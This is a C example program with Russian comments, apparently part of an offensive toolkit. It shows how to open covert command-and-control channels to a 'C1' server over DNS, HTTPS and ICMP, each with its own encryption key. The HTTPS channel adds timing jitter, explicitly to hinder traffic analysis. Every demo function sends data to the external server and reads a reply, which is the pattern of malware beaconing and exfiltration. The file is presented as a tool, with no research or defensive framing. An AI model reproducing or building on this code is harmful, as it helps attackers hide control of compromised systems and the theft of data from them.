/**
 * @file covert_channel_example.c
 * @brief Пример использования модуля скрытых каналов коммуникации
 * 
 * Этот файл демонстрирует использование API скрытых каналов для установления
 * соединения с C1 сервером и обмена данными различными методами.
 * 
 * @author NeuroZond Team
 * @date 2025-04-28
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "../network/covert_channel.h"

// Демонстрационная функция для DNS канала
void dns_channel_demo(const char* c1_server) {
    printf("[*] Демонстрация DNS канала\n");
    
    // Настройка ключа шифрования
    unsigned char key[] = "super_secret_key_for_xor_encryption";
    
    // Создание конфигурации канала
    covert_channel_config config;
    config.type = COVERT_CHANNEL_DNS;
    config.encryption = ENCRYPTION_XOR;
    config.c1_address = (char*)c1_server;
    config.c1_port = 53; // Стандартный порт DNS
    config.encryption_key = key;
    config.key_length = strlen((char*)key);
    
    // Инициализация канала
    covert_channel_handle channel = covert_channel_init(&config);
    if (!channel) {
        printf("[-] Ошибка инициализации DNS канала\n");
        return;
    }
    
    printf("[+] DNS канал инициализирован\n");
    
    // Установка соединения
    if (!covert_channel_connect(channel)) {
        printf("[-] Не удалось установить соединение по DNS каналу\n");
        covert_channel_cleanup(channel);
        return;
    }
    
    printf("[+] Соединение по DNS каналу установлено\n");
    
    // Отправка данных
    const char* message = "Пример скрытого сообщения через DNS";
    size_t sent = covert_channel_send(channel, (const unsigned char*)message, strlen(message));
    
    if (sent > 0) {
        printf("[+] Отправлено %zu байт данных\n", sent);
    } else {
        printf("[-] Ошибка отправки данных\n");
    }
    
    // Получение ответа
    unsigned char buffer[1024];
    size_t received = covert_channel_receive(channel, buffer, sizeof(buffer));
    
    if (received > 0) {
        buffer[received] = '\0'; // Null-terminator для вывода как строки
        printf("[+] Получено %zu байт: %s\n", received, buffer);
    } else {
        printf("[-] Данные не получены\n");
    }
    
    // Очистка ресурсов
    covert_channel_cleanup(channel);
    printf("[*] DNS канал закрыт\n");
}

// Демонстрационная функция для HTTPS канала
void https_channel_demo(const char* c1_server) {
    printf("[*] Демонстрация HTTPS канала\n");
    
    // Настройка ключа шифрования
    unsigned char key[] = "AES256_encryption_key_must_be_32_chars";
    
    // Создание конфигурации канала
    covert_channel_config config;
    config.type = COVERT_CHANNEL_HTTPS;
    config.encryption = ENCRYPTION_AES256;
    config.c1_address = (char*)c1_server;
    config.c1_port = 443; // Стандартный порт HTTPS
    config.encryption_key = key;
    config.key_length = strlen((char*)key);
    
    // Инициализация канала
    covert_channel_handle channel = covert_channel_init(&config);
    if (!channel) {
        printf("[-] Ошибка инициализации HTTPS канала\n");
        return;
    }
    
    printf("[+] HTTPS канал инициализирован\n");
    
    // Добавляем случайную задержку для усложнения анализа трафика
    covert_channel_set_jitter(channel, 100, 500);
    
    // Установка соединения
    if (!covert_channel_connect(channel)) {
        printf("[-] Не удалось установить соединение по HTTPS каналу\n");
        covert_channel_cleanup(channel);
        return;
    }
    
    printf("[+] Соединение по HTTPS каналу установлено\n");
    
    // Отправка данных
    const char* message = "Пример скрытого сообщения через HTTPS";
    size_t sent = covert_channel_send(channel, (const unsigned char*)message, strlen(message));
    
    if (sent > 0) {
        printf("[+] Отправлено %zu байт данных\n", sent);
    } else {
        printf("[-] Ошибка отправки данных\n");
    }
    
    // Получение ответа
    unsigned char buffer[1024];
    size_t received = covert_channel_receive(channel, buffer, sizeof(buffer));
    
    if (received > 0) {
        buffer[received] = '\0'; // Null-terminator для вывода как строки
        printf("[+] Получено %zu байт: %s\n", received, buffer);
    } else {
        printf("[-] Данные не получены\n");
    }
    
    // Очистка ресурсов
    covert_channel_cleanup(channel);
    printf("[*] HTTPS канал закрыт\n");
}

// Демонстрационная функция для ICMP канала
void icmp_channel_demo(const char* c1_server) {
    printf("[*] Демонстрация ICMP канала\n");
    
    // Настройка ключа шифрования
    unsigned char key[] = "chacha20_encryption_key_example!";
    
    // Создание конфигурации канала
    covert_channel_config config;
    config.type = COVERT_CHANNEL_ICMP;
    config.encryption = ENCRYPTION_CHACHA20;
    config.c1_address = (char*)c1_server;
    config.c1_port = 0; // Для ICMP порт не используется
    config.encryption_key = key;
    config.key_length = strlen((char*)key);
    
    // Инициализация канала
    covert_channel_handle channel = covert_channel_init(&config);
    if (!channel) {
        printf("[-] Ошибка инициализации ICMP канала\n");
        return;
    }
    
    printf("[+] ICMP канал инициализирован\n");
    
    // Установка соединения
    if (!covert_channel_connect(channel)) {
        printf("[-] Не удалось установить соединение по ICMP каналу\n");
        covert_channel_cleanup(channel);
        return;
    }
    
    printf("[+] Соединение по ICMP каналу установлено\n");
    
    // Отправка данных
    const char* message = "Пример скрытого сообщения через ICMP";
    size_t sent = covert_channel_send(channel, (const unsigned char*)message, strlen(message));
    
    if (sent > 0) {
        printf("[+] Отправлено %zu байт данных\n", sent);
    } else {
        printf("[-] Ошибка отправки данных\n");
    }
    
    // Получение ответа
    unsigned char buffer[1024];
    size_t received = covert_channel_receive(channel, buffer, sizeof(buffer));
    
    if (received > 0) {
        buffer[received] = '\0'; // Null-terminator для вывода как строки
        printf("[+] Получено %zu байт: %s\n", received, buffer);
    } else {
        printf("[-] Данные не получены\n");
    }
    
    // Очистка ресурсов
    covert_channel_cleanup(channel);
    printf("[*] ICMP канал закрыт\n");
}

int main(int argc, char* argv[]) {
    printf("[*] Демонстрация работы модуля скрытых каналов коммуникации\n");
    
    // Проверка аргументов командной строки
    if (argc < 2) {
        printf("Использование: %s <c1_server_address>\n", argv[0]);
        return 1;
    }
    
    const char* c1_server = argv[1];
    printf("[*] Используется C1 сервер: %s\n", c1_server);
    
    // Демонстрация различных типов каналов
    dns_channel_demo(c1_server);
    printf("\n");
    
    https_channel_demo(c1_server);
    printf("\n");
    
    icmp_channel_demo(c1_server);
    printf("\n");
    
    printf("[*] Демонстрация завершена\n");
    return 0;
} 